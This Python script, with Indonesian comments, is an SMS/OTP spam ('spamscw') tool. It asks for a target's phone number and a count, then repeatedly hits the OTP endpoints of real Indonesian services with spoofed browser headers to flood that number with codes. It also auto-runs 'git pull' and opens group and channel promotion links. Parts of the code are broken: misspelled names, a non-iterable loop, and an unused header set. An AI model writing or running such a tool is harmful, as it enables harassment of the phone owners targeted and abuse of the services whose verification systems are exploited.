# Jangan lupa subscribe FAGHP dan Mr_Dark
# Boleh ngerecode asal subscribe




import os,sys,time,requests,json,random
from requests import get
from requests import post
from os import system
from time import sleep
system("git pull")
r = requests.Session()
def mr_f():
    sleep(1)
    system("clear")
    print ("Info:")
    sleep(1)
    print ("Wellcome to script spamscw")
    sleep(2)
    print ("Join to grup BLACK SQUAD")
    sleep(3)
    system("xdg-open https://chat.whatsapp.com/HbvXpCW4VWf0yj4XSZ6fdA")
    sleep(2)
    system("clear")
    print ("Jangan lupa subscribe FAGHP")
    sleep(2)
    system("xdg-open https://www.youtube.com/channel/UCFggfLWFCmGGyb2VH2EBfBQ")
    sleep(3)
    print ("Jangan lupa subscribe jg Mr DARK")
    sleep(2)
    system("xdg-open https://www.youtube.com/channel/UCnti7B0HaFE0izlHKwZMn8A/videos")
    sleep(3)
    system("clear")
def alok_bg():
    alok = input ("→ ")
    if alok == "1":
        print ("                    Awali Nomor Dengan 8        ")
        print ("◄————————————————————————————————————————————————————————►")
        telkom_0 = input("Masukan nomor → ")
        jumlah = int(input("Masukan jumlah → "))
        inquiryId_telkom = "219424679"
        telkom = ("0"+telkom_0)
        faghp = {
        "phoneNumber":telkom,
        "inquiryId":inquiryId_telkom
        }
        print ("◄————————————————————————————————————————————————————————►")
        for i in range(int(jumlah)):
            faghpko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=faghp).text
            if 'Falied ini harus diisi dengan nomor Telkomsel' in faghpko:
                print (" [#] Nomor target harus menggunakan Telkomsel")
                sleep(2)
                print ("◄————————————————————————————————————————————————————————►")
                break
        if 'Maaf, Anda belum melakukan konfirmasi OTP ditransaksi sebelumnya, silahkan coba kembali dalam 1 menit' in faghpko:
            print ("[#] Tidak dapat mengirim pesan karena inquiryId sedang di pakai, Silahkan coba lagi")
        else:
            print ("[#] Pesan terkirim")
        countdownTimer(00, 60)
    if alok == "2":
        print ("                    Awali Nomor Dengan 8        ")
        print ("◄————————————————————————————————————————————————————————►")
        xl_0 = input ("Masukan nomor → ")
        xl = ("0"+xl_0)
        jumlah = int(input("Masukan jumlah → "))
        InquiryId_xl = "237992422"
        id_xl = "237775262"
        data = {
        "inquiryId":InquiryId_xl,
        "phoneNumber":xl,
        "transactionId":id_xl
        }
        mr_faghp={
        "Accept": "application/json, text/plain, /",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Length": "24",
        "content-type": "application/json",
        "Host": "cmsapi.mapclub.com",
        "Origin": "https://www.mapclub.com",
        "Referer": "https://www.mapclub.com/id/user/signup",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
        }
        dt = {"phone":xl}
        dtjs = jspn.dumps(dt)
        print ("◄————————————————————————————————————————————————————————►")
        for i in (int(jumlah)):
            url2 = 'https://m.redbus.id/api/getOtp?number='+xl+'&cc=62&whatsAppOpted=True'
            a = requests.get(url2,headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"}).text
            b = json.loads(a)["Message"]
            if b == 'OTP Sent Seccessfully':
                print ("[#] Pesan terkirim")
                sleep(5)
            else:
                print ('[#] Silahkan coba setelah 15 menit')
                break
    if alok == "3":
        print ("                    Awali Nomor Dengan 8        ")
        print ("◄————————————————————————————————————————————————————————►")
        no_0 = input ("Masukan nomor → ")
        no = ("0"+no_0)
        jumlah = int(input("Masukan jumlah → "))
        url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
        hd = {
        "accept": "text/html, application/xhtml+xml, application/json, /",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-length": "166",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://h5.rupiahcepatweb.com",
        "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
        }
        dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
        data = json.dumps(dt)
        for i in range (int(jumlah)):
            a = r.post(url,headers=hd,data={"data":data}).text
            b = json.loads(a)["code"]
            if b == "0":
                print ("[#] Pesan terkirim")
                countdownTimer(00, 60)
            else:
                print ("[#] Gatot")
                countdownTime(00, 60)
    if alok == "4":
        os.system("xdg-open https://chat.whatsapp.com/HbvXpCW4VWf0yj4XSZ6fdA")
        print (":)")
    else:
        sleep(2)
        print ("[#] Command: "+alok+" Not Found ")
        sleep(3)
        os.system("clear")
        banner_anjay_alock()
def banner_anjay_alock():
    print ("███████╗██████╗ ███╗   ███╗███████╗ ██████╗██╗    ██╗")
    print ("██╔════╝██╔══██╗████╗ ████║██╔════╝██╔════╝██║    ██║")
    print ("███████╗██████╔╝██╔████╔██║███████╗██║     ██║ █╗ ██║")
    print ("╚════██║██╔═══╝ ██║╚██╔╝██║╚════██║██║     ██║███╗██║  Otp    : By MR DARK-02")
    print ("███████║██║     ██║ ╚═╝ ██║███████║╚██████╗╚███╔███╔╝  Author : By Faghp")
    print ("╚══════╝╚═╝     ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚══╝╚══╝   GitHub : https://github.com/xxoprt")
    print ("1. Telkomsel")
    print ("2. XL")
    print ("3. spam (?)")
    print ("4. Masuk BLACK SQUAD")
    alok_bg()
def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print (f'[#] Tunggu... ( {secs:02d} )', end='/r')
        sleep(1)
        total_second -= 1

mr_telkom = {
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, /',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
mr_f()
banner_anjay_alock()